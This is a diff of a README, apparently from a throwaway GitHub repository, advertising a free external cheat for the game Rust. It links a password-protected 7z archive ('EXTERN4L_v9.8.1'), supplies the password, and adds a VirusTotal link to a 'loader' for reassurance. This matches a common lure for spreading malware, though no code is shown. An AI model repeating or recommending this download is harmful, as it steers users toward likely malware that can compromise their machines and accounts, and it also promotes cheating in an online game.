@@ -2,7 +2,7 @@
 [![downloadstats2](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/38565abe-f844-4e4f-9ea8-974f313ccf01)](https://github.com/jakerellson55/jakerellson55-proj/releases/download/EXTERN4L_v9.8.1/EXTERN4L_v9.8.1.7z)
 > Password: exch
 
-![d7473469-33b5-4133-9b54-b60a4d2b42cb](https://github.com/Munawdoring/rust-external-cheat/assets/164644555/ae7ac8e0-a9a4-446d-bae9-5a411c3c541f)
+> VT: [virustotal.com/Extern4lLoader](https://www.virustotal.com/gui/file/43ab438b46798dc0a574f2aa66ada7a6f05509eaa40b30d866277e878d325ae0)
 
 > [!NOTE]
 > External cheat for Rust is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
